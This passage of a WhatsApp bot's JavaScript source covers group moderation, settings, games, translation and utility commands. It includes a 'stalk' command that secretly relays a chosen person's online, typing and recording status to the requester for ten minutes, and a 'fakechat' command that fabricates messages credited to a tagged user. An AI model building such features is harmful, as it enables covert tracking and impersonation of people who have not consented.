        antigroupmentionSettings[m.chat] = { enabled: true, action: 'delete' };
        saveAntigroupmentionSettings(antigroupmentionSettings);
        reply(`✅ *Anti-Group-Mention enabled (delete)*`);
    } else if (args[0] === 'off') {
        antigroupmentionSettings[m.chat] = { enabled: false, action: 'delete' };
        saveAntigroupmentionSettings(antigroupmentionSettings);
        reply(`❌ *Anti-Group-Mention disabled*`);
    }
}
break;

case 'antigroupmentionkick': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    antigroupmentionSettings[m.chat] = { enabled: true, action: 'kick' };
    saveAntigroupmentionSettings(antigroupmentionSettings);
    reply(`✅ *Anti-Group-Mention KICK enabled*\nGroup-status mentions deleted + user kicked`);
}
break;

case 'antigroupmentionwarn': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    antigroupmentionSettings[m.chat] = { enabled: true, action: 'warn' };
    saveAntigroupmentionSettings(antigroupmentionSettings);
    const wl = getWarnLimit(m.chat);
    reply(`✅ *Anti-Group-Mention WARN enabled*\nGroup mentions deleted + warned. Auto-kick at ${wl} warnings`);
}
break;

// ======================[ ⚠️ WARNLIMIT ]======================
case 'warnlimit': {
    if (!m.isGroup) return reply("👥 *Groups only*");
    if (!isAdmins && !isCreator) return reply("🔒 *Admins only*");
    if (!args[0]) {
        const curLimit = getWarnLimit(m.chat);
        return reply(`⚠️ *Warn Limit*\n\n*Current:* ${curLimit} warnings before auto-kick\n\n*Usage:* \`${prefix}warnlimit 3\`\nAccepts any number 1–20`);
    }
    const newLimit = parseInt(args[0]);
    if (isNaN(newLimit) || newLimit < 1 || newLimit > 20) return reply(`❌ *Invalid value*\nEnter a number between 1 and 20`);
    setWarnLimit(m.chat, newLimit);
    reply(`✅ *Warn limit set to ${newLimit}*\nUsers will be auto-kicked after ${newLimit} warnings`);
}
break;

// ======================[ 📞 ANTI-CALL ]======================
case 'anticall': {
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings are locked by owner*');
    const _acCfg = loadAnticallCfg();
    const _acOpt = args[0]?.toLowerCase();
    if (!_acOpt) {
        return reply(
            `*📞 ANTI-CALL SETTINGS*\n\n` +
            `*Current Mode:* ${_acCfg.mode || 'off'}\n\n` +
            `*Modes:*\n` +
            `• \`${prefix}anticall off\` — Calls pass through\n` +
            `• \`${prefix}anticall decline\` — Auto-decline incoming calls\n` +
            `• \`${prefix}anticall block\` — Block caller after declining\n\n` +
            `*Custom message:* \`${prefix}setanticallmsg <text>\`\n` +
            `_Placeholders: {user} = caller mention, {calltype} = audio/video_`
        );
    }
    if (!['off', 'decline', 'block'].includes(_acOpt)) return reply(`❌ Valid modes: off, decline, block`);
    saveAnticallCfg({ mode: _acOpt });
    const _acLabels = { off: '✅ Calls allowed (off)', decline: '📵 Auto-decline enabled', block: '🚫 Auto-decline + block enabled' };
    reply(`${_acLabels[_acOpt]}`);
}
break;

case 'setanticallmsg': {
    if (!text) return reply(`❌ *Usage:* \`${prefix}setanticallmsg Hey {user}, don't {calltype} call me!\`\n\nPlaceholders: {user} = caller, {calltype} = audio/video`);
    saveAnticallMsg({ msg: text });
    reply(`✅ *Anti-call message set:*\n\n${text}\n\n_Preview: ${text.replace('{user}', '@User').replace('{calltype}', 'voice')}_`);
}
break;

case 'showanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    const _acMsg = loadAnticallMsg();
    if (!_acMsg.msg) return reply(`ℹ️ *No custom anti-call message set*\nUsing default message`);
    reply(`*📞 Current Anti-Call Message:*\n\n${_acMsg.msg}`);
}
break;

case 'delanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    saveAnticallMsg({ msg: null });
    reply(`✅ *Anti-call message reset to default*`);
}
break;

case 'testanticallmsg': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    const _acMsgData = loadAnticallMsg();
    const _acMsgText = _acMsgData.msg || `📵 Hey {user}, please don't {calltype} call me. Send a message instead!`;
    const _acPreview = _acMsgText.replace('{user}', `@${m.sender.split('@')[0]}`).replace('{calltype}', 'voice');
    reply(`*📞 Anti-Call Message Preview:*\n\n${_acPreview}`);
}
break;

// ======================[ 📊 STATUS DELAY + MULTI-EMOJI ]======================
case 'autoviewstatusdelay': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'autoViewStatusDelay', 0);
        return reply(`⏱️ *Auto-View Status Delay*\n\n*Current:* ${cur}s\n\n*Usage:* \`${prefix}autoviewstatusdelay 30s\`\nAccepts: plain seconds or compound like \`5m\`, \`2h\`, \`1h30m\`\nMax: 23h • 0 = instant`);
    }
    const _parseDelay = (str) => {
        let s = 0;
        const hm = str.match(/(\d+)h/); const mm = str.match(/(\d+)m(?!s)/); const sm2 = str.match(/(\d+)s/);
        if (hm) s += parseInt(hm[1]) * 3600;
        if (mm) s += parseInt(mm[1]) * 60;
        if (sm2) s += parseInt(sm2[1]);
        if (!hm && !mm && !sm2) s = parseInt(str) || 0;
        return Math.min(s, 23 * 3600);
    };
    const delay = _parseDelay(args[0]);
    setSetting(botNumber, 'autoViewStatusDelay', delay);
    reply(`✅ *Auto-view status delay set to ${delay}s*`);
}
break;

case 'autoreactstatusdelay': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'autoReactStatusDelay', 0);
        return reply(`⏱️ *Auto-React Status Delay*\n\n*Current:* ${cur}s\n\n*Usage:* \`${prefix}autoreactstatusdelay 10m\`\nAccepts: \`30s\`, \`5m\`, \`2h\`, \`1h30m\`\n0 = instant`);
    }
    const _parseDelay2 = (str) => {
        let s = 0;
        const hm = str.match(/(\d+)h/); const mm = str.match(/(\d+)m(?!s)/); const sm2 = str.match(/(\d+)s/);
        if (hm) s += parseInt(hm[1]) * 3600;
        if (mm) s += parseInt(mm[1]) * 60;
        if (sm2) s += parseInt(sm2[1]);
        if (!hm && !mm && !sm2) s = parseInt(str) || 0;
        return Math.min(s, 23 * 3600);
    };
    const delay2 = _parseDelay2(args[0]);
    setSetting(botNumber, 'autoReactStatusDelay', delay2);
    reply(`✅ *Auto-react status delay set to ${delay2}s*`);
}
break;

case 'statusemoji': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) {
        const cur = getSetting(botNumber, 'statusEmojis', ['❤️']);
        return reply(`😊 *Status Emoji Settings*\n\n*Current:* ${cur.join(', ')}\n\n*Usage:*\n• \`${prefix}statusemoji 💚\` — single emoji\n• \`${prefix}statusemoji 💚,❤️,💙,💛\` — multiple (comma-separated, random pick)\n\nAny emoji accepted`);
    }
    const _emojis = text.split(',').map(e => e.trim()).filter(Boolean);
    setSetting(botNumber, 'statusEmojis', _emojis);
    reply(`✅ *Status emojis set:* ${_emojis.join(' ')}\n${_emojis.length > 1 ? `_One will be picked at random per status_` : ''}`);
}
break;

// ======================[ 🔒 LOCK SETTINGS ]======================
case 'locksettings': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const _lsOpt = args[0]?.toLowerCase();
    if (!_lsOpt) {
        const locked = isSettingsLocked();
        return reply(`🔒 *Lock Settings*\n\n*Current:* ${locked ? '🔒 LOCKED (owner-only writes)' : '🔓 UNLOCKED'}\n\n*Usage:*\n• \`${prefix}locksettings on\` — Only owner can change settings\n• \`${prefix}locksettings off\` — Anyone can use settings commands`);
    }
    if (_lsOpt === 'on') { setSettingsLock(true); reply(`🔒 *Settings locked*\nOnly you (owner) can change bot settings`); }
    else if (_lsOpt === 'off') { setSettingsLock(false); reply(`🔓 *Settings unlocked*`); }
    else reply(`❌ Use: \`${prefix}locksettings on/off\``);
}
break;

// ======================[ 🎭 STICKER COMMANDS ]======================
case 'setstickercmd': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply(`❌ *Usage:* Reply to a sticker with \`${prefix}setstickercmd <command>\`\nExample: \`${prefix}setstickercmd menu\``);
    const _scCmdName = args[0].toLowerCase();
    if (!m.quoted || m.quoted.mtype !== 'stickerMessage') return reply(`❌ *Reply to a sticker* to bind it\nExample: reply to a sticker with \`${prefix}setstickercmd ping\``);
    const _scHash = _stickerFileKey(m.quoted) || m.quoted.key?.id || '';
    const _scData = loadStickerCmds();
    _scData[_scHash] = _scCmdName;
    saveStickerCmds(_scData);
    reply(`✅ *Sticker bound to command:* \`${prefix}${_scCmdName}\`\nSending that sticker will now run \`${prefix}${_scCmdName}\``);
}
break;

case 'delstickercmd': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (!args[0]) return reply(`❌ *Usage:* \`${prefix}delstickercmd <command>\``);
    const _dscName = args[0].toLowerCase();
    const _dscData = loadStickerCmds();
    const _dscKey = Object.keys(_dscData).find(k => _dscData[k] === _dscName);
    if (!_dscKey) return reply(`⚠️ No sticker bound to command \`${prefix}${_dscName}\``);
    delete _dscData[_dscKey];
    saveStickerCmds(_dscData);
    reply(`✅ *Sticker alias removed:* \`${prefix}${_dscName}\``);
}
break;

case 'stickercmds': {
    const _scList = loadStickerCmds();
    const _scEntries = Object.values(_scList);
    if (_scEntries.length === 0) return reply(`📭 *No sticker commands registered*\nUse \`${prefix}setstickercmd <cmd>\` to bind a sticker`);
    reply(`🎭 *Sticker Command Bindings*\n\n${_scEntries.map((cmd, i) => `${i + 1}. \`${prefix}${cmd}\``).join('\n')}\n\n_Send the bound sticker to fire that command_`);
}
break;

// ======================[ ⚙️ SET / SETTINGS / CONFIG ]======================
case 'set':
case 'settings':
case 'config': {
    if (!isCreator && !isSudo) return reply('🔒 *Owner/Sudo only*');
    if (isSettingsLocked() && !isCreator) return reply('🔒 *Settings locked by owner*');

    const _setKey = args[0]?.toLowerCase();
    const _setVal = args.slice(1).join(' ').trim();

    if (!_setKey) {
        // Show current settings summary
        const _adM = loadAntideleteCfg(jidToNum(getBotJid(devtrust))).mode || 'off';
        const _aeM = loadAntieditCfg(jidToNum(getBotJid(devtrust))).mode || 'off';
        const _acM = loadAnticallCfg().mode || 'off';
        const _locked = isSettingsLocked();
        const _sEmojis = getSetting(botNumber, 'statusEmojis', ['❤️']).join(', ');
        const _adDelay = getSetting(botNumber, 'autoViewStatusDelay', 0);
        const _arDelay = getSetting(botNumber, 'autoReactStatusDelay', 0);
        return reply(
            `*⚙️ BOT SETTINGS*\n\n` +
            `*🔰 Anti-Delete:* ${_adM}\n` +
            `*✏️ Anti-Edit:* ${_aeM}\n` +
            `*📞 Anti-Call:* ${_acM}\n` +
            `*🔒 Lock Settings:* ${_locked ? 'ON' : 'OFF'}\n` +
            `*😊 Status Emoji:* ${_sEmojis}\n` +
            `*⏱️ View Status Delay:* ${_adDelay}s\n` +
            `*⏱️ React Status Delay:* ${_arDelay}s\n\n` +
            `*Quick commands:*\n` +
            `• \`${prefix}set antidelete private\`\n` +
            `• \`${prefix}set antiedit private_groups\`\n` +
            `• \`${prefix}set anticall decline\`\n` +
            `• \`${prefix}set warnlimit 3\`\n` +
            `• \`${prefix}set statusemoji 🔥,💯,❤️\`\n` +
            `• \`${prefix}set autoviewstatusdelay 2m30s\`\n` +
            `• \`${prefix}set autoreactstatusdelay 10m\`\n` +
            `• \`${prefix}set locksettings on\``
        );
    }

    // Handle .set <key> <value> shorthand
    switch (_setKey) {
        case 'antidelete': {
            const _adModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
            if (!_adModes.includes(_setVal)) return reply(`❌ Valid: ${_adModes.join(', ')}`);
            saveAntideleteCfg({ mode: _setVal }, jidToNum(getBotJid(devtrust)));
            return reply(`✅ *antidelete* set to: *${_setVal}*`);
        }
        case 'antiedit': {
            const _aeModes = ['private', 'private_pm', 'private_groups', 'chat', 'chat_groups', 'off'];
            if (!_aeModes.includes(_setVal)) return reply(`❌ Valid: ${_aeModes.join(', ')}`);
            saveAntieditCfg({ mode: _setVal }, jidToNum(getBotJid(devtrust)));
            return reply(`✅ *antiedit* set to: *${_setVal}*`);
        }
        case 'anticall': {
            if (!['off', 'decline', 'block'].includes(_setVal)) return reply(`❌ Valid: off, decline, block`);
            saveAnticallCfg({ mode: _setVal });
            return reply(`✅ *anticall* set to: *${_setVal}*`);
        }
        case 'warnlimit': {
            if (!m.isGroup) return reply("👥 *Groups only for warnlimit*");
            const nl = parseInt(_setVal);
            if (isNaN(nl) || nl < 1 || nl > 20) return reply(`❌ Enter a number 1–20`);
            setWarnLimit(m.chat, nl);
            return reply(`✅ *warnlimit* set to: *${nl}*`);
        }
        case 'statusemoji': {
            const _se = _setVal.split(',').map(e => e.trim()).filter(Boolean);
            if (_se.length === 0) return reply(`❌ Provide at least one emoji`);
            setSetting(botNumber, 'statusEmojis', _se);
            return reply(`✅ *statusemoji* set to: ${_se.join(' ')}`);
        }
        case 'autoviewstatusdelay': {
            const _parseD = (s) => {
                let sec = 0;
                const h = s.match(/(\d+)h/); const mi = s.match(/(\d+)m(?!s)/); const sc = s.match(/(\d+)s/);
                if (h) sec += parseInt(h[1]) * 3600;
                if (mi) sec += parseInt(mi[1]) * 60;
                if (sc) sec += parseInt(sc[1]);
                if (!h && !mi && !sc) sec = parseInt(s) || 0;
                return Math.min(sec, 23 * 3600);
            };
            const d = _parseD(_setVal);
            setSetting(botNumber, 'autoViewStatusDelay', d);
            return reply(`✅ *autoviewstatusdelay* set to: *${d}s*`);
        }
        case 'autoreactstatusdelay': {
            const _parseD2 = (s) => {
                let sec = 0;
                const h = s.match(/(\d+)h/); const mi = s.match(/(\d+)m(?!s)/); const sc = s.match(/(\d+)s/);
                if (h) sec += parseInt(h[1]) * 3600;
                if (mi) sec += parseInt(mi[1]) * 60;
                if (sc) sec += parseInt(sc[1]);
                if (!h && !mi && !sc) sec = parseInt(s) || 0;
                return Math.min(sec, 23 * 3600);
            };
            const d2 = _parseD2(_setVal);
            setSetting(botNumber, 'autoReactStatusDelay', d2);
            return reply(`✅ *autoreactstatusdelay* set to: *${d2}s*`);
        }
        case 'locksettings': {
            if (!isCreator) return reply('🔒 *Owner only*');
            if (!['on', 'off'].includes(_setVal)) return reply(`❌ Use: on or off`);
            setSettingsLock(_setVal === 'on');
            return reply(`${_setVal === 'on' ? '🔒' : '🔓'} *locksettings* set to: *${_setVal}*`);
        }
        default:
            return reply(`❓ Unknown setting: *${_setKey}*\n\nType \`${prefix}set\` to see all settings`);
    }
}
break;

// ═══════════════════════════════════════════════════════
// 🌐 TRANSLATE
// ═══════════════════════════════════════════════════════
case 'translate':
case 'tr': {
    if (!text) return reply(`🌐 *Usage:* ${prefix}translate [lang code] [text]\n\nExamples:\n• ${prefix}translate ur Hello how are you\n• ${prefix}translate en Mera naam kya hai\n\n*Common codes:* ur=Urdu, en=English, ar=Arabic, hi=Hindi, fr=French, es=Spanish`);
    
    const parts = text.split(' ');
    const targetLang = parts[0].toLowerCase();
    const inputText = parts.slice(1).join(' ');
    
    if (!inputText) return reply("❌ *Text missing*\nExample: translate ur Hello world");
    
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '🌐', key: m.key } });
        const res = await axios.get(
            `https://api.mymemory.translated.net/get?q=${encodeURIComponent(inputText)}&langpair=auto|${targetLang}`,
            { timeout: 15000 }
        );
        const translated = res.data?.responseData?.translatedText;
        if (!translated || translated === inputText) throw new Error('No translation');
        
        reply(`🌐 *CYBER Translate*\n\n📝 *Original:*\n${inputText}\n\n✅ *Translated (${targetLang.toUpperCase()}):*\n${translated}`);
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        reply("❌ *Translation failed* • Try again later");
    }
}
break;

// ═══════════════════════════════════════════════════════
// 📖 BIO — Fetch WhatsApp About/Status
// ═══════════════════════════════════════════════════════
case 'bio':
case 'about':
case 'status': {
    let bioTarget = m.mentionedJid?.[0] || m.quoted?.sender || (!m.isGroup ? m.chat : m.sender);
    const bioNum = bioTarget.split('@')[0];
    
    try {
        const statusRes = await devtrust.fetchStatus(bioTarget).catch(() => null);
        const bioText = statusRes?.status || statusRes?.setAt ? statusRes.status : null;
        
        if (!bioText) {
            reply(`📝 *WhatsApp Bio*\n\n👤 @${bioNum}\n\n_No bio / private_`);
        } else {
            reply(`📝 *WhatsApp Bio*\n\n👤 @${bioNum}\n\n"${bioText}"`);
        }
    } catch {
        reply(`📝 *WhatsApp Bio*\n\n👤 @${bioNum}\n\n_No bio / private_`);
    }
}
break;

// ═══════════════════════════════════════════════════════
// 👁️ STALK — WhatsApp Online Tracker (silently to DM)
// ═══════════════════════════════════════════════════════
case 'stalk':
case 'onlinestalk': {
    let stalkTarget = m.mentionedJid?.[0] 
        || (text ? (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net') : null)
        || m.quoted?.sender;
    
    if (!stalkTarget) return reply(`👁️ *Usage:* ${prefix}stalk @someone\nOr: ${prefix}stalk 923001234567`);
    
    const stalkNum = stalkTarget.split('@')[0];
    
    try {
        // Subscribe to presence updates
        await devtrust.subscribePresence(stalkTarget);
        reply(`👁️ *Stalk Mode ON*\n\n🎯 Target: @${stalkNum}\n📩 Jab bhi online aaye ga, tumhare DM mein aayega!\n\n_(Next 10 min tak monitor karunga)_`);
        
        // Listen for this specific target's presence
        const stalkHandler = async (update) => {
            const { id, presences } = update;
            if (!presences) return;
            const presence = presences[stalkTarget];
            if (!presence) return;
            
            const isOnline = presence.lastKnownPresence === 'available' || presence.lastKnownPresence === 'composing';
            const statusText = presence.lastKnownPresence === 'composing' ? '⌨️ Typing...' 
                : presence.lastKnownPresence === 'recording' ? '🎤 Recording...'
                : isOnline ? '🟢 Online!' : '🔴 Offline';
            
            const now = new Date().toLocaleTimeString('en-PK', { timeZone: 'Asia/Karachi', hour: '2-digit', minute: '2-digit' });
            
            devtrust.sendMessage(m.sender, {
                text: `👁️ *STALK ALERT*\n\n👤 @${stalkNum}\n📡 ${statusText}\n🕐 Time: ${now}`
            });
        };
        
        devtrust.ev.on('presence.update', stalkHandler);
        
        // Auto-remove listener after 10 minutes
        setTimeout(() => {
            devtrust.ev.off('presence.update', stalkHandler);
            devtrust.sendMessage(m.sender, { 
                text: `👁️ *Stalk Ended*\n\n🎯 @${stalkNum} ka stalk 10 min complete\n📊 Monitor band ho gaya` 
            });
        }, 10 * 60 * 1000);
        
    } catch (e) {
        reply("❌ *Stalk failed* • Privacy settings ya invalid number");
    }
}
break;

// ═══════════════════════════════════════════════════════
// ⌨️ FAKETYPING — Show typing indicator in chat
// ═══════════════════════════════════════════════════════
case 'faketyping':
case 'typing': {
    if (!m.isGroup) return reply("👥 *Groups only* • DM mein typing visible nahi hoti");
    
    const duration = text ? Math.min(parseInt(text) || 10, 60) : 10;
    reply(`⌨️ *Fake Typing started for ${duration} seconds...*`);
    
    // Send composing presence repeatedly
    let elapsed = 0;
    const typingInterval = setInterval(async () => {
        elapsed += 3;
        if (elapsed >= duration) {
            clearInterval(typingInterval);
            await devtrust.sendPresenceUpdate('paused', m.chat);
            return;
        }
        await devtrust.sendPresenceUpdate('composing', m.chat);
    }, 3000);
    
    // Initial trigger
    await devtrust.sendPresenceUpdate('composing', m.chat);
}
break;

// ═══════════════════════════════════════════════════════
// 🔤 WORDGAME — Word Chain Game
// ═══════════════════════════════════════════════════════
case 'wordgame':
case 'wordchain': {
    const wordGameData = global.wordGameSessions = global.wordGameSessions || new Map();
    
    if (text === 'stop' || text === 'end') {
        wordGameData.delete(m.chat);
        reply("🔤 *Word Chain Game ended!*");
        break;
    }
    
    if (!wordGameData.has(m.chat)) {
        // Start new game
        const startWord = text || 'orange';
        wordGameData.set(m.chat, { 
            lastWord: startWord.toLowerCase(), 
            usedWords: new Set([startWord.toLowerCase()]),
            lastPlayer: m.sender
        });
        reply(`🔤 *Word Chain Game Started!*\n\n📏 Rules:\n• Agla word pichle word ki *last letter* se shuru hona chahiye\n• Word repeat nahi ho sakta\n• Command: ${prefix}wc [word]\n\n▶️ *Starting word:* *${startWord}*\n\n_Next word must start with: *${startWord.slice(-1).toUpperCase()}*_`);
        break;
    }
    
    const session = wordGameData.get(m.chat);
    
    if (!text) return reply(`🔤 *Word Game Active!*\n\nLast word: *${session.lastWord}*\nNext letter: *${session.lastWord.slice(-1).toUpperCase()}*\n\nType: ${prefix}wc [word]`);
    
    const word = text.toLowerCase().trim().replace(/[^a-z]/g, '');
    
    if (!word) return reply("❌ Only English words allowed");
    if (session.usedWords.has(word)) return reply(`❌ *"${word}"* already used! Try another`);
    if (word[0] !== session.lastWord.slice(-1)) {
        return reply(`❌ Word must start with *"${session.lastWord.slice(-1).toUpperCase()}"*\n\nLast word was: *${session.lastWord}*`);
    }
    
    session.usedWords.add(word);
    session.lastWord = word;
    session.lastPlayer = m.sender;
    
    reply(`✅ *${word}* — Good!\n\n🔤 Next word must start with: *${word.slice(-1).toUpperCase()}*\n📊 Words played: ${session.usedWords.size}`);
}
break;

// alias for wordchain
case 'wc': {
    // redirect to wordgame handler — just fall through by duplicating
    const wordGameData2 = global.wordGameSessions = global.wordGameSessions || new Map();
    
    if (text === 'stop' || text === 'end') {
        wordGameData2.delete(m.chat);
        reply("🔤 *Word Chain Game ended!*");
        break;
    }
    
    if (!wordGameData2.has(m.chat)) {
        return reply(`🔤 Word game nahi chal raha\nShuru karne ke liye: ${prefix}wordgame`);
    }
    
    const session2 = wordGameData2.get(m.chat);
    if (!text) return reply(`🔤 *Word Game Active!*\n\nLast word: *${session2.lastWord}*\nNext letter: *${session2.lastWord.slice(-1).toUpperCase()}*`);
    
    const word2 = text.toLowerCase().trim().replace(/[^a-z]/g, '');
    if (!word2) return reply("❌ Only English words allowed");
    if (session2.usedWords.has(word2)) return reply(`❌ *"${word2}"* already used!`);
    if (word2[0] !== session2.lastWord.slice(-1)) {
        return reply(`❌ Word must start with *"${session2.lastWord.slice(-1).toUpperCase()}"*`);
    }
    session2.usedWords.add(word2);
    session2.lastWord = word2;
    reply(`✅ *${word2}* — Good!\n🔤 Next: *${word2.slice(-1).toUpperCase()}*\n📊 Words: ${session2.usedWords.size}`);
}
break;

// ═══════════════════════════════════════════════════════
// 😂 MEME — Random meme fetcher
// ═══════════════════════════════════════════════════════
case 'meme':
case 'randmeme': {
    try {
        await devtrust.sendMessage(m.chat, { react: { text: '😂', key: m.key } });
        const subs = ['memes','dankmemes','me_irl','funny','ProgrammerHumor'];
        const sub = subs[Math.floor(Math.random() * subs.length)];
        const res = await axios.get(`https://meme-api.com/gimme/${sub}`, { timeout: 15000 });
        const meme = res.data;
        if (!meme?.url) throw new Error('No meme');
        
        await devtrust.sendMessage(m.chat, addNewsletterContext({
            image: { url: meme.url },
            caption: `😂 *${meme.title}*\n\n👍 ${meme.ups} upvotes • r/${meme.subreddit}`
        }), { quoted: m });
        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    } catch (e) {
        reply("❌ *Meme fetch failed* • Try again!");
    }
}
break;

// ═══════════════════════════════════════════════════════
// 🤥 FAKECHAT — Generate fake WhatsApp chat style message  
// ═══════════════════════════════════════════════════════
case 'fakechat':
case 'fakemsg': {
    if (!text) return reply(`🤥 *Usage:* ${prefix}fakechat @person message\nExample: ${prefix}fakechat @Ali Yaar kal milte hain`);
    
    let fakeTarget = m.mentionedJid?.[0];
    let fakeMsg = text;
    if (fakeTarget) {
        fakeMsg = text.replace(/@\d+/, '').trim();
    }
    
    const fakeName = fakeTarget ? (await devtrust.getName(fakeTarget).catch(() => fakeTarget?.split('@')[0])) : 'Unknown';
    const fakeTime = new Date().toLocaleTimeString('en-PK', { timeZone: 'Asia/Karachi', hour: '2-digit', minute: '2-digit' });
    
    const fakeChat = `╔══════════════════╗
║   💬 WhatsApp     ║
╠══════════════════╣
║ 👤 ${fakeName.padEnd(14)}║
║ ─────────────────║
║ ${fakeMsg.substring(0,16).padEnd(16)} ║
║                  ║
║ ${fakeTime}           ✓✓ ║
╚══════════════════╝`;
    
    reply(`🤥 *Fake Chat*\n\n\`\`\`${fakeChat}\`\`\``);
}
break;

// ═══════════════════════════════════════════════════════
// 🎭 ROASTME — Roast yourself (no target needed)
// ═══════════════════════════════════════════════════════
case 'roastme': {
    const selfRoasts = [
        "Tumhari personality itni boring hai ke tumhara shadow bhi tumhara saath chhod deta hai",
        "Tum itne slow ho ke tortoise bhi tumhara status dekhke khud ko fast samjhne laga",
        "Tumhari intelligence aur WiFi signal dono zero pe hi rehte hain",
        "Tum WhatsApp pe online rehte ho par reply nahi karte — spam bhi useful hota hai tum se zyada",
        "Tumhara life plan wo blank page jaisa hai jo save karna bhool gaye",
        "Tum itne predictable ho ke even surprises tumse bore ho jate hain",
        "Subah uthke mirror dekhte ho toh mirror bhi crack hone ki sochta hai",
        "Google bhi tumhe search kare toh '404 personality not found' aata hai"
    ];
    reply(`🔥 *CYBER Self-Roast*\n\n${selfRoasts[Math.floor(Math.random() * selfRoasts.length)]}`);
}
break;

// ═══════════════════════════════════════════════════════
// 🎯 DARE — Quick dare without truth
// ═══════════════════════════════════════════════════════
case 'dare': {
    const dares = [
        "Apne best friend ko abhi call karo aur kehna 'I miss you' aur call kaat do",
        "Apna phone kisi ko do aur woh koi bhi message bhej sakta hai jisko chahey",
        "Agle 3 messages mein sirf caps mein likhna hoga",
        "Apni voice mein koi bhi gaana record karke is chat mein bhejo",
        "Apna embarrassing childhood story batao",
        "Kisi random contact ko 'Happy Birthday' bhejo chahe unka birthday ho ya na ho",
        "Next message mein apni duniya ki best selfie bhejo",
        "1 minute mein 15 star bhi karo aur video send karo"
    ];
    reply(`🎯 *CYBER DARE*\n\n${dares[Math.floor(Math.random() * dares.length)]}`);
}
break;

// ═══════════════════════════════════════════════════════
// 💡 FACT — Random fun fact
// ═══════════════════════════════════════════════════════
case 'fact':
case 'funfact': {
    try {
        const res = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random?language=en', { timeout: 10000 });
        const fact = res.data?.text;
        if (!fact) throw new Error('No fact');
        reply(`💡 *Random Fact*\n\n${fact}`);
    } catch {
        const facts = [
            "Honey never spoils — 3000-year-old honey found in Egyptian tombs was still edible!",
            "A day on Venus is longer than a year on Venus.",
            "Cleopatra lived closer in time to the Moon landing than to the building of the Great Pyramid.",
            "Bananas are slightly radioactive due to their potassium content.",
            "Octopuses have three hearts and blue blood.",
            "The human brain uses about 20% of the body's total energy.",
            "Sharks are older than trees — they've been around for 450 million years.",
        ];
        reply(`💡 *Random Fact*\n\n${facts[Math.floor(Math.random() * facts.length)]}`);
    }
}
break;

// ═══════════════════════════════════════════════════════
// 🧠 RIDDLE — Random riddle
// ═══════════════════════════════════════════════════════
case 'riddle': {
    const riddles = [
        { q: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?", a: "An echo" },
        { q: "The more you take, the more you leave behind. What am I?", a: "Footsteps" },
        { q: "I have cities, but no houses live there. I have mountains but no trees. I have water but no fish. What am I?", a: "A map" },
        { q: "What can travel around the world while staying in a corner?", a: "A stamp" },
        { q: "I'm light as a feather, yet the strongest man can't hold me for five minutes. What am I?", a: "Breath" },
        { q: "What has hands but can't clap?", a: "A clock" },
        { q: "What gets wetter as it dries?", a: "A towel" },
        { q: "I have a head and a tail but no body. What am I?", a: "A coin" }
    ];
    const r = riddles[Math.floor(Math.random() * riddles.length)];
    global.lastRiddle = global.lastRiddle || {};
    global.lastRiddle[m.chat] = r.a;
    reply(`🧠 *CYBER Riddle*\n\n${r.q}\n\n_Jawab: ${prefix}riddleans_`);
}
break;

case 'riddleans':
case 'riddleanswer': {
    const ans = global.lastRiddle?.[m.chat];
    if (!ans) return reply("❓ Pehle ${prefix}riddle se riddle lo");
    reply(`✅ *Riddle Answer:*\n\n${ans}`);
    delete global.lastRiddle[m.chat];
}
break;

// ═══════════════════════════════════════════════════════
// 🔢 CALC — Quick calculator alias
// ═══════════════════════════════════════════════════════
case 'calc': {
    if (!text) return reply("🧮 *Usage:* calc 25*4+100\nOperators: + - * / ^ ( )");
    try {
        const safeExpr = text.replace(/[^0-9\+\-\*\/\.\(\)\s\^]/g, '').replace(/\^/g, '**');
        const result = Function('"use strict"; return (' + safeExpr + ')')();
        if (typeof result !== 'number' || !isFinite(result)) throw new Error('Invalid');
        reply(`🧮 *Calculator*\n\n${text} = *${result}*`);
    } catch {
        reply("❌ *Invalid expression*\nExample: calc 25*4+100");
    }
}
break;

// ═══════════════════════════════════════════════════════
// 😴 LASTSEEN — Fetch last seen time
// ═══════════════════════════════════════════════════════
case 'lastseen':
case 'ls': {
    let lsTarget = m.mentionedJid?.[0]
        || (text ? (text.replace(/[^0-9]/g,'') + '@s.whatsapp.net') : null)
        || m.quoted?.sender;

    if (!lsTarget || lsTarget === '@s.whatsapp.net') return reply("\u{1F440} *Usage:* " + prefix + "lastseen @someone\n\nExample: .lastseen 923137140784");

    const lsNum = lsTarget.split('@')[0];
    let info = [];

    try {
        const [waCheck] = await devtrust.onWhatsApp(lsTarget);
        if (!waCheck || !waCheck.exists) {
            return reply("\u274C *Number not on WhatsApp*\n\u{1F464} @" + lsNum);
        }
        info.push("\u2705 Number registered on WhatsApp");

        const store = devtrust.store || {};
        const cached = store.presences?.[lsTarget];
        if (cached?.lastKnownPresence) {
            const status = cached.lastKnownPresence === 'available'
                ? "\u{1F7E2} *Online right now*"
                : (cached.lastSeen ? "\u{1F534} *Last seen:* " + cached.lastSeen : "\u26A0\uFE0F *Offline* (time unknown)");
            return reply("\u{1F440} *Last Seen \u2014 @" + lsNum + "*\n\n" + info.join('\n') + "\n\n" + status);
        }

        let hasProfilePic = false;
